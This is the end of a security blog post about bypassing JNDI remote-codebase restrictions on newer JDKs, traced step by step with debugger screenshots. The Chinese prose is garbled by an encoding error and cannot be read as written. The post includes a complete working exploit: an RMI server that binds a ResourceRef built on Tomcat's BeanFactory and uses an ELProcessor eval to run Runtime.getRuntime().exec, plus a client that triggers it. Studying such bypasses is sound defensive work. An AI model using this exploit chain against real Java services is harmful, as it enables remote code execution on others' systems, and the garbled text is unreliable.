<p>ç„¶ååˆè°ƒç”¨äº†c_lookupæ–¹æ³•ï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="47"><img src="https://bloyet.github.io/post-images/1749492629586.png" alt="" loading="lazy"></figure>
<p>ç„¶ååœ¨è°ƒç”¨getObjectInstanceæ–¹æ³•ï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="48"><img src="https://bloyet.github.io/post-images/1749492629602.png" alt="" loading="lazy"></figure>
<p>ç„¶åç»§ç»­è°ƒç”¨getObjectFactoryFromReferenceï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="49"><img src="https://bloyet.github.io/post-images/1749492629618.png" alt="" loading="lazy"></figure>
<p>åœ¨è¿™é‡Œè¿›è¡ŒåŠ è½½å­—èŠ‚ç </p>
<figure data-type="image" tabindex="50"><img src="https://bloyet.github.io/post-images/1749492629633.png" alt="" loading="lazy"></figure>
<h1 id="jndié«˜ç‰ˆæœ¬æ€ä¹ˆå®ç°ç»•è¿‡">JNDIé«˜ç‰ˆæœ¬æ€ä¹ˆå®ç°ç»•è¿‡</h1>
<h2 id="æºç å¯¹æ¯”">æºç å¯¹æ¯”ï¼š</h2>
<p>åœ¨ä½ç‰ˆæœ¬JDK_8u65ä¸‹ï¼Œåœ¨<code>RegistryContext#decodeObject()</code>æ–¹æ³•ä¼šç›´æ¥è°ƒç”¨åˆ°<code>NamingManager#getObjectInstance()</code>ï¼Œè¿›è€Œè°ƒç”¨<code>getObjectFactoryFromReference()</code>æ–¹æ³•æ¥è·å–è¿œç¨‹å·¥å‚ç±»</p>
<figure data-type="image" tabindex="51"><img src="https://bloyet.github.io/post-images/1749492629648.png" alt="" loading="lazy"></figure>
<p>JDK_8u241</p>
<figure data-type="image" tabindex="52"><img src="https://bloyet.github.io/post-images/1749492629664.png" alt="" loading="lazy"></figure>
<p>å¢åŠ äº†ä¸€å±‚ç±»å‹æ£€æŸ¥ä»¥åŠ<code>trustURLCodebase</code>çš„æ£€æŸ¥ã€‚åŸºæœ¬ä¸Šè¿œç¨‹ codebase éƒ½ä¸ä¼šè¢«å…è®¸åŠ è½½äº†ï¼Œ</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æœ¬åœ°åŠ è½½å»ç»•è¿‡å®ƒï¼Œæˆ‘è§‰å¾—ç”¨æœ¬åœ°è§£æ æ›´å‡†ç¡®ã€‚åŸç†æ˜¯æœåŠ¡å™¨ä¼ é€’äº†ä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥è¿›è¡Œæœ¬åœ°è§£æçš„ç±»ï¼Œç„¶åå®¢æˆ·ç«¯ç”¨å·²æœ‰çš„ç»„ä»¶è¿›è¡Œäº†è§£æï¼Œå¯¼è‡´äº†RCE</p>
<h2 id="ç»•è¿‡é™åˆ¶">ç»•è¿‡é™åˆ¶</h2>
<p>è¯¥æœ¬åœ°å·¥å‚ç±»å¿…é¡»å®ç°<code>javax.naming.spi.ObjectFactory</code>æ¥å£,å› ä¸ºåœ¨<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>æœ€åçš„<code>return</code>è¯­å¥å¯¹<code>Factory</code>ç±»çš„å®ä¾‹å¯¹è±¡è¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”è¯¥å·¥å‚ç±»è‡³å°‘å­˜åœ¨ä¸€ä¸ª<code>getObjectInstance()</code>æ–¹æ³•</p>
<p><code>org.apache.naming.factory.BeanFactory</code>å°±æ˜¯æ»¡è¶³æ¡ä»¶ä¹‹ä¸€ï¼Œå¹¶ç”±äºè¯¥ç±»å­˜åœ¨äºTomcat8ä¾èµ–åŒ…ä¸­ï¼Œæ”»å‡»é¢å’ŒæˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚</p>
<p><code>BeanFactory</code> åœ¨ <code>getObjectInstance()</code>ä¼šé€šè¿‡å‚æ•°æŒ‡å®šè¿›è¡Œç±»åŠ è½½ï¼Œå¦‚ä½•è¿™ä¸ªç±»æ˜¯å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ï¼Œé‚£å°±èƒ½RCEäº†</p>
<p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç±»å‹åˆ¤æ–­ï¼ˆæ˜¯å¦ä¸ºResourceRefï¼Œæ˜¯å°±å¯ä»¥è¿›è¡Œç±»åŠ è½½äº†ï¼‰ï¼Œæˆ‘ä»¬è¿˜å¾—å¯¹å®ƒè¿›è¡ŒåŒ…è£…ä¸€ä¸‹</p>
<figure data-type="image" tabindex="53"><img src="https://bloyet.github.io/post-images/1749492629680.png" alt="" loading="lazy"></figure>
<h2 id="å¤ç°">å¤ç°</h2>
<p>ç¯å¢ƒï¼š</p>
<p>å…ˆå¯¼å…¥å¯¹åº”çš„ä¾èµ–</p>
<pre><code class="language-java">&lt;dependency&gt;
    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
    &lt;version&gt;8.5.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;
    &lt;version&gt;8.5.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>æœåŠ¡ç«¯ï¼š</p>
<pre><code class="language-java">package org.example;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMI_server_bypass {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=eval&quot;));
        resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind(&quot;Bloyet&quot;, referenceWrapper);
        System.out.println(&quot;Registryè¿è¡Œä¸­......&quot;);

    }
}
</code></pre>
<p>å®¢æˆ·ç«¯</p>
<pre><code class="language-java">package org.example;
import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDI {
    public static void main(String[] args) throws Exception {

        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
        //åˆå§‹åŒ–ä¸Šä¸‹æ–‡
        Context context = new InitialContext();

        //è°ƒç”¨è¿œç¨‹ç±»
        context.lookup(string);


    }
}
</code></pre>
<h2 id="æµç¨‹åˆ†æ-3">æµç¨‹åˆ†æ</h2>
<p>æ–­ç‚¹æ‰“åœ¨ï¼š</p>
<p>æ­¥å…¥</p>
<figure data-type="image" tabindex="54"><img src="https://bloyet.github.io/post-images/1749492629696.png" alt="" loading="lazy"></figure>
<p>ç›´æ¥çœ‹lookupäº†ï¼Œå‰é¢é‚£ä¸ªå‡½æ•°æµç¨‹ä¸å˜</p>
<figure data-type="image" tabindex="55"><img src="https://bloyet.github.io/post-images/1749492629712.png" alt="" loading="lazy"></figure>
<p>è°ƒç”¨RegistryContext çš„ lookup</p>
<figure data-type="image" tabindex="56"><img src="https://bloyet.github.io/post-images/1749492629728.png" alt="" loading="lazy"></figure>
<p>RMI åŸç”Ÿè·å–åˆ°å­—èŠ‚ç ä¹‹åï¼Œè°ƒç”¨decodeObject</p>
<figure data-type="image" tabindex="57"><img src="https://bloyet.github.io/post-images/1749492629743.png" alt="" loading="lazy"></figure>
<p>é¦–å…ˆå°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºRemoteReferenceç±»å‹ï¼Œå¦‚æœæ˜¯å°±ç›´æ¥æŠŠæˆ‘ä»¬è¦å®ä¾‹åŒ–çš„å¯¹è±¡ç›´æ¥å¼ºåˆ¶è½¬æ¢æˆRemoteReferenceç±»å‹ï¼Œä¼šå¯¼è‡´åé¢çš„ç¬¬äºŒä¸ªifè¿›å»ï¼Œå¯¼è‡´åŠ è½½å¤±è´¥</p>
<p>è°ƒç”¨NamingManager#getObjectInstanceï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="58"><img src="https://bloyet.github.io/post-images/1749492629759.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="59"><img src="https://bloyet.github.io/post-images/1749492629775.png" alt="" loading="lazy"></figure>
<p>é€šè¿‡getFactoryClassName è·å–åˆ°å·¥å‚ç±»çš„å…¨ç±»åï¼Œè°ƒç”¨<code>getObjectFactoryFromReference</code>å…ˆå¯¹å®ƒè¿›è¡Œç±»åŠ è½½<br>
ç„¶åå¼€å§‹è°ƒç”¨å·¥å‚ç±»çš„<code>getObjectInstance</code>å¯¹ç±»å®ç°å®ä¾‹åŒ–åŠ è½½</p>
<figure data-type="image" tabindex="60"><img src="https://bloyet.github.io/post-images/1749492629792.png" alt="" loading="lazy"></figure>
<p>åŠ è½½å­—èŠ‚ç ï¼Œ</p>
<figure data-type="image" tabindex="61"><img src="https://bloyet.github.io/post-images/1749492629806.png" alt="" loading="lazy"></figure>
<p>è·å–æ–¹æ³•ï¼Œè°ƒç”¨invoke</p>
<figure data-type="image" tabindex="62"><img src="https://bloyet.github.io/post-images/1749492629821.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="63"><img src="https://bloyet.github.io/post-images/1749492629837.png" alt="" loading="lazy"></figure>
<p>æ€»ç»“ï¼š</p>
<p>ä¸ºäº†è·å–åˆ° context å®ä¾‹è€Œå»æ„é€  factory å·¥å‚ç±»ï¼Œç„¶åé€šè¿‡ factory å»å®ä¾‹åŒ– contextï¼Œç„¶åå†å»é€šè¿‡ context å»è°ƒç”¨å„ç§æ–¹æ³•</p>
]]></content>
    </entry>
</feed>